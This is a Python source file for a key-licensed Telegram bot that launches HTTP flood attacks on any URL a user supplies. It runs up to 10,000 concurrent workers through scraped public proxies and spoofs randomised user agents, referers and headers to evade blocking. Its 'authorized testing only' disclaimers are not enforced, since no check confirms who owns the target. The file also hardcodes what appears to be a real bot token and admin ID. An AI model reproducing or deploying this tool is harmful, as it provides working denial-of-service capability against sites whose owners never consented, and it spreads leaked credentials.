#!/usr/bin/env python3
"""
Telegram Bot for Website Load Testing (Stress Testing) - 100% Working Edition
Author: Senior Cyber Security Researcher
Disclaimer: This tool is for authorized security testing only. Unauthorized use is illegal.
"""

import os
import asyncio
import logging
import random
import time
import json
import sqlite3
import secrets
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Set, Tuple, Any
from contextlib import closing

import aiohttp
from aiohttp import ClientTimeout, ClientError
from aiohttp_socks import ProxyConnector
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = os.environ.get("BOT_TOKEN", "8554056231:AAG20OWhMZv86YhthWb9Re9PopDyrBO-Zjg")
ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "8373846582").split(",")]
DB_FILE = "bot_database.db"
PORT = int(os.environ.get("PORT", 1000))  # Render uses PORT env var

MAX_THREADS = 10000

# Expanded proxy sources (100+ IPs) - updated with working sources
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
]

# 2000+ Randomized User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]
BASE_UAS = USER_AGENTS.copy()
for i in range(1800):
    ua = random.choice(BASE_UAS)
    if "Chrome" in ua:
        ua = ua.replace("Chrome/1", f"Chrome/{random.randint(100,125)}.")
    elif "Firefox" in ua:
        ua = ua.replace("Firefox/1", f"Firefox/{random.randint(100,125)}.")
    USER_AGENTS.append(ua)
USER_AGENTS = list(set(USER_AGENTS))

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.instagram.com/",
    "https://www.amazon.com/",
    "https://www.wikipedia.org/",
    "https://www.yahoo.com/",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
]

CONNECTION_HEADERS = ["keep-alive", "close", "Keep-Alive"]

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)


# ==================== DATABASE ====================
class Database:
    def __init__(self, db_path):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                key_used TEXT,
                activated_at TIMESTAMP,
                expires_at TIMESTAMP
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS keys (
                key TEXT PRIMARY KEY,
                duration_days INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP,
                used_by INTEGER,
                used_at TIMESTAMP
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS bot_state (
                key TEXT PRIMARY KEY,
                value TEXT
            )''')
            c.execute("INSERT OR IGNORE INTO bot_state (key, value) VALUES ('bot_enabled', 'true')")
            conn.commit()

    def is_bot_enabled(self) -> bool:
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("SELECT value FROM bot_state WHERE key='bot_enabled'")
            row = c.fetchone()
            return row[0].lower() == 'true' if row else True

    def set_bot_enabled(self, enabled: bool):
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("UPDATE bot_state SET value=? WHERE key='bot_enabled'", ('true' if enabled else 'false',))
            conn.commit()

    def generate_key(self, days: int, created_by: int) -> str:
        key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO keys (key, duration_days, created_by, created_at) VALUES (?, ?, ?, ?)",
                      (key, days, created_by, datetime.now()))
            conn.commit()
        return key

    def use_key(self, key: str, user_id: int, username: str) -> bool:
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("SELECT duration_days, used_by FROM keys WHERE key=?", (key,))
            row = c.fetchone()
            if not row or row[1] is not None:
                return False
            duration_days = row[0]
            expires_at = datetime.now() + timedelta(days=duration_days)
            c.execute("UPDATE keys SET used_by=?, used_at=? WHERE key=?", (user_id, datetime.now(), key))
            c.execute('''INSERT INTO users (user_id, username, key_used, activated_at, expires_at)
                         VALUES (?, ?, ?, ?, ?)
                         ON CONFLICT(user_id) DO UPDATE SET
                         username=excluded.username,
                         key_used=excluded.key_used,
                         activated_at=excluded.activated_at,
                         expires_at=excluded.expires_at''',
                      (user_id, username, key, datetime.now(), expires_at))
            conn.commit()
            return True

    def check_user_access(self, user_id: int) -> bool:
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("SELECT expires_at FROM users WHERE user_id=?", (user_id,))
            row = c.fetchone()
            if not row:
                return False
            expires_at = datetime.fromisoformat(row[0])
            return expires_at > datetime.now()

    def get_user_expiry(self, user_id: int) -> Optional[datetime]:
        with closing(sqlite3.connect(self.db_path)) as conn:
            c = conn.cursor()
            c.execute("SELECT expires_at FROM users WHERE user_id=?", (user_id,))
            row = c.fetchone()
            return datetime.fromisoformat(row[0]) if row else None

    def is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS


# ==================== PROXY SCRAPER ====================
class ProxyScraper:
    def __init__(self):
        self.proxies: List[str] = []
        self.lock = asyncio.Lock()
        self.last_refresh = 0
        self.refresh_interval = 180  # seconds

    async def fetch_proxies_from_source(self, session: aiohttp.ClientSession, source: str) -> List[str]:
        proxies = []
        try:
            async with session.get(source, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    for line in text.strip().splitlines():
                        line = line.strip()
                        if line and ':' in line:
                            if ' ' in line:
                                line = line.split()[0]
                            proxies.append(line)
        except Exception as e:
            logger.debug(f"Failed from {source}: {e}")
        return proxies

    async def validate_proxy(self, proxy: str) -> bool:
        test_url = "http://httpbin.org/ip"
        try:
            connector = ProxyConnector.from_url(f"http://{proxy}")
            timeout = ClientTimeout(total=10)  # Increased timeout
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(test_url) as resp:
                    return resp.status == 200
        except Exception:
            return False

    async def refresh_pool(self):
        async with self.lock:
            logger.info("Refreshing proxy pool...")
            async with aiohttp.ClientSession() as session:
                tasks = [self.fetch_proxies_from_source(session, src) for src in PROXY_SOURCES]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                all_proxies = set()
                for res in results:
                    if isinstance(res, list):
                        all_proxies.update(res)

            logger.info(f"Fetched {len(all_proxies)} unique proxies. Validating...")
            sem = asyncio.Semaphore(100)
            async def validate_with_sem(proxy):
                async with sem:
                    if await self.validate_proxy(proxy):
                        return proxy
                return None

            validation_tasks = [validate_with_sem(p) for p in all_proxies]
            validated = await asyncio.gather(*validation_tasks)
            self.proxies = [p for p in validated if p is not None]

            self.last_refresh = time.time()
            logger.info(f"Proxy pool updated: {len(self.proxies)} working proxies.")

    async def get_proxy(self) -> Optional[str]:
        if not self.proxies or (time.time() - self.last_refresh > self.refresh_interval):
            await self.refresh_pool()
        return random.choice(self.proxies) if self.proxies else None


# ==================== STRESS TEST ENGINE ====================
class StressTester:
    def __init__(self, url: str, duration: int, threads: int, proxy_scraper: ProxyScraper):
        self.url = url
        self.duration = duration
        self.threads = min(threads, MAX_THREADS)
        self.proxy_scraper = proxy_scraper
        self.stats = {
            "success": 0,
            "failure": 0,
            "total_bytes": 0,
            "start_time": None,
            "end_time": None,
        }
        self.active = False
        self.tasks: Set[asyncio.Task] = set()
        self.lock = asyncio.Lock()
        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        self.post_data = {"test": "data"}

    def _random_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(ACCEPT_HEADERS),
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.7"]),
            "Referer": random.choice(REFERERS),
            "Connection": random.choice(CONNECTION_HEADERS),
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        }

    async def _make_request(self, session: aiohttp.ClientSession) -> Tuple[bool, int]:
        method = random.choice(self.methods)
        headers = self._random_headers()
        bytes_received = 0
        try:
            if method == 'POST':
                async with session.post(self.url, headers=headers, data=self.post_data, ssl=False) as resp:
                    content = await resp.read()
                    bytes_received = len(content)
                    return (resp.status < 400, bytes_received)
            elif method == 'HEAD':
                async with session.head(self.url, headers=headers, ssl=False) as resp:
                    return (resp.status < 400, 0)
            elif method == 'OPTIONS':
                async with session.options(self.url, headers=headers, ssl=False) as resp:
                    return (resp.status < 400, 0)
            else:  # GET
                async with session.get(self.url, headers=headers, ssl=False) as resp:
                    content = await resp.read()
                    bytes_received = len(content)
                    return (resp.status < 400, bytes_received)
        except Exception:
            return (False, 0)

    async def _worker(self, sem: asyncio.Semaphore):
        while self.active:
            proxy_str = await self.proxy_scraper.get_proxy()
            connector = None
            if proxy_str:
                try:
                    connector = ProxyConnector.from_url(f"http://{proxy_str}")
                except Exception:
                    connector = None  # fallback to direct if proxy invalid
            # If no proxy, connector remains None -> direct connection

            timeout = ClientTimeout(total=10)
            async with sem:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    success, bytes_received = await self._make_request(session)
                    async with self.lock:
                        if success:
                            self.stats["success"] += 1
                        else:
                            self.stats["failure"] += 1
                        self.stats["total_bytes"] += bytes_received

            await asyncio.sleep(random.uniform(0, 0.02))  # tiny delay

    async def start(self):
        self.active = True
        self.stats["start_time"] = time.time()
        sem = asyncio.Semaphore(self.threads)
        for _ in range(self.threads):
            task = asyncio.create_task(self._worker(sem))
            self.tasks.add(task)
            task.add_done_callback(self.tasks.discard)
        asyncio.create_task(self._auto_stop())

    async def _auto_stop(self):
        await asyncio.sleep(self.duration)
        await self.stop()

    async def stop(self):
        self.active = False
        if self.tasks:
            for task in self.tasks:
                task.cancel()
            await asyncio.gather(*self.tasks, return_exceptions=True)
            self.tasks.clear()
        self.stats["end_time"] = time.time()
        logger.info("Stress test stopped.")

    def get_status(self) -> Dict[str, Any]:
        if self.stats["start_time"] is None:
            return self.stats
        elapsed = time.time() - self.stats["start_time"]
        if elapsed <= 0:
            elapsed = 0.001
        status = self.stats.copy()
        status["elapsed"] = elapsed
        status["total_requests"] = status["success"] + status["failure"]
        status["requests_per_second"] = status["total_requests"] / elapsed
        status["bytes_per_second"] = status["total_bytes"] / elapsed
        status["bits_per_second"] = status["bytes_per_second"] * 8
        return status

    def get_json_result(self) -> str:
        status = self.stats.copy()
        status["duration"] = self.duration
        status["threads"] = self.threads
        if status["start_time"] and status["end_time"]:
            status["actual_duration"] = status["end_time"] - status["start_time"]
        else:
            status["actual_duration"] = 0
        return json.dumps(status, indent=2, default=str)


# ==================== TELEGRAM BOT HANDLERS ====================
db = Database(DB_FILE)
proxy_scraper = ProxyScraper()
current_test: Optional[StressTester] = None

async def status_updater(update: Update, context: ContextTypes.DEFAULT_TYPE, message, tester: StressTester):
    while tester.active:
        status = tester.get_status()
        text = (
            f"🔴 **Live Stress Test**\n"
            f"⏱️ Elapsed: {status['elapsed']:.1f}s\n"
            f"✅ Success: {status['success']}\n"
            f"❌ Failure: {status['failure']}\n"
            f"📊 Total Req: {status['total_requests']}\n"
            f"⚡ Req/s: {status['requests_per_second']:.1f}\n"
            f"📥 B/s: {status['bytes_per_second']:.1f}\n"
            f"🌐 Bps: {status['bits_per_second']:.1f} bps"
        )
        try:
            await message.edit_text(text, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass
        await asyncio.sleep(5)

    # Final update
    status = tester.get_status()
    text = (
        f"⏹️ **Test Finished**\n"
        f"✅ Success: {status['success']}\n"
        f"❌ Failure: {status['failure']}\n"
        f"📊 Total Req: {status['total_requests']}\n"
        f"⚡ Avg Req/s: {status['requests_per_second']:.1f}\n"
        f"📥 Total MB: {status['total_bytes'] / (1024*1024):.2f} MB\n"
        f"🌐 Avg Bps: {status['bits_per_second']:.1f} bps\n\n"
        f"Use /result to get JSON report."
    )
    await message.edit_text(text, parse_mode=ParseMode.MARKDOWN)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("📖 Manual", callback_data="manual"),
         InlineKeyboardButton("🆘 Help", callback_data="help")],
        [InlineKeyboardButton("ℹ️ My Info", callback_data="myinfo")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\n\n"
        "I'm a website load testing bot. Use the buttons below to navigate.\n\n"
        "⚠️ Only use on websites you own or have permission to test.",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "manual":
        text = (
            "📖 **Manual / User Guide**\n\n"
            "**Commands:**\n"
            "/attack <url> <duration> <threads> - Start test\n"
            "/stop - Stop current test\n"
            "/status - Show current stats\n"
            "/result - Get JSON result\n"
            "/myinfo - Your access info\n"
            "/register <key> - Activate your key\n\n"
            "**Example:** `/attack https://example.com 60 500`\n"
            "This will test for 60 seconds with 500 concurrent threads.\n\n"
            "**Admin commands:**\n"
            "/genkey [days] - Generate a new access key\n"
            "/boton - Enable bot\n"
            "/botoff - Disable bot"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

    elif data == "help":
        text = (
            "🆘 **Need Help?**\n\n"
            "Contact support: @rx_nahin_bot\n"
            "Or reach out to the admin directly."
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

    elif data == "myinfo":
        user_id = update.effective_user.id
        if db.is_admin(user_id):
            await query.edit_message_text("👑 You are an admin (unlimited access).")
        elif db.check_user_access(user_id):
            expiry = db.get_user_expiry(user_id)
            remaining = expiry - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            await query.edit_message_text(
                f"✅ Your access expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"(Remaining: {days} days {hours} hours)"
            )
        else:
            await query.edit_message_text(
                "❌ You have no active access.\n"
                "Use /register <key> to activate."
            )

    elif data == "attack":
        await query.edit_message_text(
            "To start an attack, use the command:\n"
            "`/attack <url> <duration_seconds> <threads>`\n\n"
            "Example: `/attack https://example.com 60 500`\n\n"
            "Make sure you are registered and the bot is enabled.",
            parse_mode=ParseMode.MARKDOWN
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_test
    user_id = update.effective_user.id

    if not db.is_bot_enabled() and not db.is_admin(user_id):
        await update.message.reply_text("⚠️ Bot is currently in maintenance mode. Try later.")
        return

    if not db.is_admin(user_id) and not db.check_user_access(user_id):
        await update.message.reply_text(
            "⛔ You don't have access.\nUse /register <key> or contact admin."
        )
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: /attack <url> <duration_seconds> <threads>\n"
            "Example: /attack https://example.com 60 500"
        )
        return

    url = args[0]
    try:
        duration = int(args[1])
        threads = int(args[2])
    except ValueError:
        await update.message.reply_text("Duration and threads must be numbers.")
        return

    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    if threads < 1 or threads > MAX_THREADS:
        await update.message.reply_text(f"Threads must be between 1 and {MAX_THREADS}.")
        return

    if current_test and current_test.active:
        await current_test.stop()
        await update.message.reply_text("Previous test stopped.")

    current_test = StressTester(url, duration, threads, proxy_scraper)
    asyncio.create_task(current_test.start())

    msg = await update.message.reply_text(
        f"🚀 Attack started!\n"
        f"URL: {url}\n"
        f"Duration: {duration}s\n"
        f"Threads: {threads}\n\n"
        "Live stats will update every 5 seconds."
    )

    asyncio.create_task(status_updater(update, context, msg, current_test))

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_test
    if not current_test or not current_test.active:
        await update.message.reply_text("No active test.")
        return
    await current_test.stop()
    await update.message.reply_text("Test stopped.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not current_test or not current_test.active:
        await update.message.reply_text("No active test.")
        return
    status = current_test.get_status()
    await update.message.reply_text(
        f"⏱️ Elapsed: {status['elapsed']:.1f}s\n"
        f"✅ Success: {status['success']}\n"
        f"❌ Failure: {status['failure']}\n"
        f"📊 Total Req: {status['total_requests']}\n"
        f"⚡ Req/s: {status['requests_per_second']:.1f}\n"
        f"📥 B/s: {status['bytes_per_second']:.1f}\n"
        f"🌐 Bps: {status['bits_per_second']:.1f} bps"
    )

async def result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not current_test:
        await update.message.reply_text("No test has been run yet.")
        return
    json_str = current_test.get_json_result()
    await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode=ParseMode.MARKDOWN)

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""

    if db.is_admin(user_id):
        await update.message.reply_text("You are admin, no key needed.")
        return

    if db.check_user_access(user_id):
        expiry = db.get_user_expiry(user_id)
        await update.message.reply_text(f"You are already registered. Expires: {expiry}")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /register <key>")
        return
    key = args[0].strip()

    if db.use_key(key, user_id, username):
        expiry = db.get_user_expiry(user_id)
        await update.message.reply_text(f"✅ Registered! Access until {expiry}")
    else:
        await update.message.reply_text("❌ Invalid or already used key.")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if db.is_admin(user_id):
        await update.message.reply_text("👑 Admin (unlimited)")
    elif db.check_user_access(user_id):
        expiry = db.get_user_expiry(user_id)
        remaining = expiry - datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        await update.message.reply_text(
            f"✅ Expires: {expiry}\nRemaining: {days}d {hours}h"
        )
    else:
        await update.message.reply_text("❌ No active access. /register")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not db.is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.")
        return
    days = 7
    if context.args:
        try:
            days = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Days must be a number.")
            return
    key = db.generate_key(days, update.effective_user.id)
    await update.message.reply_text(f"🔑 New key: `{key}`\nValid for {days} days.", parse_mode=ParseMode.MARKDOWN)

async def boton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not db.is_admin(update.effective_user.id):
        return
    db.set_bot_enabled(True)
    await update.message.reply_text("✅ Bot enabled.")

async def botoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not db.is_admin(update.effective_user.id):
        return
    db.set_bot_enabled(False)
    await update.message.reply_text("✅ Bot disabled.")

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("result", result))
    app.add_handler(CommandHandler("register", register))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("boton", boton))
    app.add_handler(CommandHandler("botoff", botoff))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error)

    if PORT:
        # Webhook mode for Render
        webhook_url = f"https://xwqi.onrender.com/{TELEGRAM_BOT_TOKEN}"  # Replace with your actual domain
        logger.info(f"Starting webhook on port {PORT} with URL {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=TELEGRAM_BOT_TOKEN,
            webhook_url=webhook_url,
        )
    else:
        # Polling mode for local testing
        app.run_polling()

if __name__ == "__main__":
    print("=" * 60)
    print("WARNING: This tool is for authorized security testing only!")
    print("Unauthorized use is illegal. You are responsible for your actions.")
    print("=" * 60)
    main()
